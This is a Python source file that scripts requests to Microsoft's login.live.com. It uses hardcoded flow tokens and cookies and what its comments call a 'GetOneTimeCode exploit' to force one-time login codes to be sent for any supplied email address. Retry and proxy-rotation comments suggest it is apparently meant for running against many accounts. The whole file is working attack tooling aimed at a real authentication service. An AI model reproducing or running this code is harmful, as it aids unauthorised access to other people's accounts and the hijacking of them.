from securing.utils.cookies.get_livedata import livedata
import json
import logging

import httpx

log = logging.getLogger(__name__)


async def send_auth(session: httpx.AsyncClient, email: str, proof: str = None) -> dict | None:
    # GetCredential no longer forces OTPs
    # Uses a GetOneTimeCode exploit to force it
    send_auth = await session.post(
        url="https://login.live.com/GetCredentialType.srf",
        headers={
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json; charset=utf-8",
            "Cookie": "MSPOK=$uuid-899fc7db-4aba-4e53-b33b-7b3268c26691",
            "Referer": "https://login.live.com/",
            "hpgact": "0",
            "hpgid": "33",
        },
        json={
            "checkPhones": True,
            "country": "",
            "federationFlags": 3,
            "flowToken": "-DgAlkPotvHRxxasQViSq!n6!RCUSpfUm9bdVClpM6KR98HGq7plohQHfFANfGn4P7PN2GnUuAtn6Nu3dwU!Tisic5PrgO7w8Rn*LCKKQhcTDUPMM2QJJdjr4QkcdUXmPnuK!JOqW7GdIx3*icazjg5ZaS8w1ily5GLFRwdvobIOBDZP11n4dWICmPafkNpj5fKAMg3!ZY2EhKB7pVJ8ir4A$",
            "forceotclogin": False,
            "isCookieBannerShown": True,
            "isExternalFederationDisallowed": True,
            "isFederationDisabled": True,
            "isFidoSupported": False,
            "isOtherIdpSupported": False,
            "isReactLoginRequest": True,
            "isRemoteConnectSupported": False,
            "isRemoteNGCSupported": True,
            "isSignup": False,
            "otclogindisallowed": False,
            "username": email,
        },
    )

    body = send_auth.text or ""
    print(f"SendAuth Response: {body[:800]}")
    if not body.strip():
        # Empty body is almost always a dead proxy tunnel / MS flake — retryable.
        log.error(
            "send_auth: empty GetCredentialType response status=%s for %s",
            send_auth.status_code,
            email,
        )
        raise httpx.RemoteProtocolError(
            f"GetCredentialType empty response (status={send_auth.status_code})"
        )

    try:
        email_info = send_auth.json()
    except json.JSONDecodeError as exc:
        log.error(
            "send_auth: non-JSON GetCredentialType status=%s for %s snippet=%r",
            send_auth.status_code,
            email,
            body[:400],
        )
        # Treat as transport flake so proxy retry / SSID rotate can kick in.
        raise httpx.RemoteProtocolError(
            f"GetCredentialType non-JSON response (status={send_auth.status_code})"
        ) from exc

    # There are secondary methods
    if "Credentials" in email_info:

        # Authenticator Request
        if "RemoteNgcParams" in email_info["Credentials"]:
            return {
                "type": "authenticator",
                "response": email_info,
            }

        # Email OTP Request
        if "OtcLoginEligibleProofs" in email_info["Credentials"]:

            altemaile = email_info["Credentials"]["OtcLoginEligibleProofs"][0]["data"]

            # Get the login PPFT
            live = await livedata(session)
            flowtoken = live["ppft"]

            # Two tipes of OTPs
            # eOTT_OtcLogin -> Account has a security email
            # eOTT_NoPasswordAccountLoginCode -> Primary receives OTPs
            # Right now only handles 1 security mail
            payload = {
                "login": email,
                "flowtoken": flowtoken,
                "purpose": "eOTT_OtcLogin",
                "channel": "Email",
                "ChallengeViewSupported": 1,
                "AltEmailE": altemaile,
                "lcid": 1033,
            }

            if proof:
                payload["ProofConfirmation"] = proof

            security_mail = email_info["Credentials"]["OtcLoginEligibleProofs"][0]["display"]
            if security_mail == email:
                print(f"[~] - Switched OTP Type")
                payload["purpose"] = "eOTT_NoPasswordAccountLoginCode"

            await session.post(
                url="https://login.live.com/GetOneTimeCode.srf?id=38936",
                headers={
                    "Accept": "application/json",
                    "Content-type": "application/x-www-form-urlencoded",
                },
                data=payload,
            )

            return {
                "type": "email",
                "response": email_info,
                "ppft": flowtoken,
            }

    return email_info
